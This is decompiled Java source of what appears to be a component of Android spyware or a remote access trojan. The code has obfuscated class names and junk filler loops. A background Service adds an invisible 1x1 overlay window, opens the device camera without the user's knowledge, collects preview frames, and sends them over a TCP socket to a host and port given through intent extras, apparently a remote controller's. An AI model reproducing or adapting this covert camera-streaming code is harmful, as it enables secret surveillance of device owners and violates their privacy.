package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
/* loaded from: classes.dex */
public class illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12 extends Service implements SurfaceHolder.Callback {

    /* renamed from: g */
    public static Camera f230g;

    /* renamed from: h */
    public static Socket f231h;

    /* renamed from: i */
    public static OutputStream f232i;

    /* renamed from: j */
    public static WindowManager f233j;

    /* renamed from: k */
    public static SurfaceView f234k;

    /* renamed from: l */
    public static WindowManager.LayoutParams f235l;

    /* renamed from: m */
    private static Object f236m = new Object();

    /* renamed from: e */
    private String[] f241e;

    /* renamed from: a */
    public boolean f237a = false;

    /* renamed from: b */
    public boolean f238b = false;

    /* renamed from: c */
    public boolean f239c = false;

    /* renamed from: d */
    private List<byte[]> f240d = new ArrayList();

    /* renamed from: f */
    private int f242f = 70;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$a */
    /* loaded from: classes.dex */
    public class RunnableC0052a implements Runnable {

        /* renamed from: a */
        final /* synthetic */ String f243a;

        /* renamed from: b */
        final /* synthetic */ int f244b;

        RunnableC0052a(String str, int i) {
            this.f243a = str;
            this.f244b = i;
        }

        @Override // java.lang.Runnable
        public void run() {
            int i = 0;
            do {
                if (i >= 3) {
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.m187m();
                }
                try {
                    InetSocketAddress inetSocketAddress = new InetSocketAddress(InetAddress.getByName(this.f243a), this.f244b);
                    Socket socket = new Socket();
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h = socket;
                    socket.setSoTimeout(0);
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h.setKeepAlive(true);
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h.setTcpNoDelay(true);
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h.connect(inetSocketAddress, 60000);
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f238b = illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h.isConnected();
                    if (illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f238b) {
                        illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f232i = illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h.getOutputStream();
                        illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f239c = true;
                        illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.m189k();
                        return;
                    }
                } catch (SocketException unused) {
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.m190j();
                } catch (UnknownHostException unused2) {
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.m190j();
                    Boolean bool2 = Boolean.TRUE;
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                    while (bool2.booleanValue()) {
                        bool2 = Boolean.FALSE;
                    }
                } catch (Exception unused3) {
                    illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.m190j();
                    Boolean bool3 = Boolean.TRUE;
                    while (bool3.booleanValue()) {
                        bool3 = Boolean.FALSE;
                    }
                    while (bool3.booleanValue()) {
                        bool3 = Boolean.FALSE;
                    }
                    while (bool3.booleanValue()) {
                        bool3 = Boolean.FALSE;
                    }
                    while (bool3.booleanValue()) {
                        bool3 = Boolean.FALSE;
                    }
                }
                try {
                    Thread.sleep(1L);
                } catch (InterruptedException unused4) {
                }
                i++;
            } while (!illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f238b);
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$b */
    /* loaded from: classes.dex */
    class C0053b implements Camera.PreviewCallback {
        C0053b() {
        }

        @Override // android.hardware.Camera.PreviewCallback
        public void onPreviewFrame(byte[] bArr, Camera camera) {
            if (bArr == null) {
                return;
            }
            try {
                try {
                    if (illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f231h == null || !illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f238b || illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f232i == null) {
                        return;
                    }
                    synchronized (illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.f236m) {
                        illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.this.f240d.add(bArr);
                    }
                } catch (OutOfMemoryError unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12$c */
    /* loaded from: classes.dex */
    public class RunnableC0054c implements Runnable {
        RunnableC0054c() {
        }

        /* JADX WARN: Removed duplicated region for block: B:37:0x00a5 A[Catch: Exception | OutOfMemoryError -> 0x012f, TryCatch #3 {Exception | OutOfMemoryError -> 0x012f, blocks: (B:6:0x0019, B:7:0x001d, B:18:0x0048, B:35:0x0073, B:37:0x00a5, B:38:0x00b7, B:54:0x012c, B:41:0x0101, B:42:0x0108, B:44:0x010e, B:45:0x0111, B:47:0x0117, B:48:0x011a, B:50:0x0120, B:51:0x0123, B:53:0x0129, B:22:0x004d, B:23:0x004f, B:25:0x0055, B:26:0x0058, B:28:0x005e, B:29:0x0061, B:31:0x0067, B:32:0x006a, B:34:0x0070, B:39:0x00ec), top: B:66:0x0019, inners: #6 }] */
        @Override // java.lang.Runnable
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public void run() {
            /*
                Method dump skipped, instructions count: 314
                To view this dump add '--comments-level debug' option
            */
            throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.RunnableC0054c.run():void");
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: j */
    public void m190j() {
        this.f239c = false;
        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f281o = false;
        try {
            f231h.shutdownOutput();
        } catch (SocketException unused) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        } catch (IOException unused2) {
            Boolean bool2 = Boolean.TRUE;
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
        }
        try {
            f231h.shutdownInput();
        } catch (SocketException | IOException unused3) {
        }
        try {
            f231h.getOutputStream().close();
        } catch (SocketException | IOException unused4) {
        }
        try {
            f231h.getInputStream().close();
        } catch (SocketException | IOException unused5) {
        }
        try {
            f231h.close();
        } catch (SocketException | IOException unused6) {
        }
        OutputStream outputStream = f232i;
        if (outputStream != null) {
            try {
                outputStream.close();
            } catch (SocketException | IOException unused7) {
            }
            f232i = null;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: l */
    public int m188l(int i, int i2) {
        if (i > 61440) {
            return 15;
        }
        if (i > 51200) {
            return 25;
        }
        if (i > 40960) {
            return 35;
        }
        if (i > 30720) {
            return 45;
        }
        if (i > 20480) {
            return 65;
        }
        if (i > 10240) {
            return 75;
        }
        return i2;
    }

    /* renamed from: a */
    public void m199a(String str, int i) {
        new Thread(new RunnableC0052a(str, i)).start();
    }

    /* renamed from: i */
    public boolean m191i() {
        try {
            Camera open = Camera.open();
            if (open != null) {
                open.release();
                return false;
            }
            return false;
        } catch (RuntimeException unused) {
            return true;
        }
    }

    /* renamed from: k */
    public void m189k() {
        new Thread(new RunnableC0054c()).start();
    }

    /* renamed from: m */
    public void m187m() {
        try {
            if (f230g != null) {
                f230g.setPreviewCallback(null);
                f230g.release();
                f230g = null;
            }
            m190j();
            if (!this.f237a) {
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f297C.removeView(f234k);
            }
            this.f237a = false;
        } catch (Exception unused) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        stopService(new Intent(this, illvmiabcohqzkcgedrljlfscagmyvpyakmqfbbsjsqqhmjvft12.class));
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        C0045d.f161B = 0;
        m187m();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        String str;
        Integer valueOf;
        try {
            sendBroadcast(new Intent(getApplicationContext(), utrwrkgcoszzetveklqskawdjgejdycnriijuwnlwjpiutrpty14_CA.class).setAction("xyz"));
            String str2 = C0047e.f214d;
            if (intent != null && intent.hasExtra(str2)) {
                if (hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f297C == null || hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f298D == null) {
                    this.f241e = intent.getStringArrayExtra(str2);
                    boolean m191i = m191i();
                    this.f237a = m191i;
                    if (!m191i) {
                        f233j = (WindowManager) getSystemService("window");
                        f234k = new SurfaceView(this);
                        f235l = Build.VERSION.SDK_INT >= 26 ? new WindowManager.LayoutParams(1, 1, 2038, 56, -3) : new WindowManager.LayoutParams(1, 1, 2006, 262144, -3);
                        f235l.gravity = 51;
                        f233j.addView(f234k, f235l);
                        f234k.getHolder().addCallback(this);
                        str = this.f241e[1];
                        valueOf = Integer.valueOf(this.f241e[2]);
                        m199a(str, valueOf.intValue());
                    }
                    m187m();
                } else {
                    this.f241e = intent.getStringArrayExtra(str2);
                    boolean m191i2 = m191i();
                    this.f237a = m191i2;
                    if (!m191i2) {
                        f234k = new SurfaceView(this);
                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f298D.gravity = 51;
                        hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f297C.addView(f234k, hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f298D);
                        f234k.getHolder().addCallback(this);
                        str = this.f241e[1];
                        valueOf = Integer.valueOf(this.f241e[2]);
                        m199a(str, valueOf.intValue());
                    }
                    m187m();
                }
            }
            return 1;
        } catch (Exception unused) {
            return 2;
        }
    }

    @Override // android.view.SurfaceHolder.Callback
    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
        Camera camera = f230g;
        if (camera != null) {
            camera.setPreviewCallback(new C0053b());
        }
    }

    @Override // android.view.SurfaceHolder.Callback
    public void surfaceCreated(SurfaceHolder surfaceHolder) {
        String[] split = this.f241e[0].split(",");
        try {
            f230g = Camera.open(Integer.valueOf(split[0]).intValue());
        } catch (RuntimeException unused) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
        try {
            Camera.Parameters parameters = f230g.getParameters();
            Camera.Size size = null;
            if (f230g.getParameters().getSupportedPreviewSizes() != null) {
                for (Camera.Size size2 : f230g.getParameters().getSupportedPreviewSizes()) {
                    if (size2.width > 600 && size2.height > 400) {
                        size = size2;
                    }
                }
            }
            try {
                if (split.length > 1) {
                    size.width = Integer.valueOf(split[1]).intValue();
                    size.height = Integer.valueOf(split[2]).intValue();
                    this.f242f = Integer.valueOf(split[3]).intValue();
                }
            } catch (Exception unused2) {
                size.width = 0;
                size.height = 0;
            }
            if (size.width == 0 || size.height == 0) {
                size.width = 640;
                size.height = 480;
            }
            if (Integer.valueOf(this.f241e[4]).intValue() == 1 && parameters.getSupportedFocusModes().contains("continuous-video")) {
                parameters.setFocusMode("continuous-video");
            }
            parameters.setPreviewSize(size.width, size.height);
            parameters.setPreviewFormat(17);
            f230g.setParameters(parameters);
            f230g.setPreviewDisplay(surfaceHolder);
            f230g.startPreview();
        } catch (Exception unused3) {
            Boolean bool2 = Boolean.TRUE;
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
            while (bool2.booleanValue()) {
                bool2 = Boolean.FALSE;
            }
        }
    }

    @Override // android.view.SurfaceHolder.Callback
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }
}
